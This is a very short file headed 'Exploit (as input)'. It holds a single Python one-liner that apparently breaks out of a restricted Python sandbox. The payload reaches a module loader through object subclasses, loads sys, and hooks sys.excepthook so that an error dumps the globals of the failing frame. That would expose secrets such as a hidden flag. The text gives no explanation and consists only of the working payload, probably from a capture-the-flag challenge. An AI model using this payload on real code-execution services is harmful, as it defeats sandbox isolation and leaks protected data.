# Exploit (as input)

(s:=().__class__.__base__.__subclasses__()[120]().load_module('sys'),s.__setattr__('excepthook',lambda *a:s.stdout.write(a[2].tb_frame.f_globals.__str__())),a)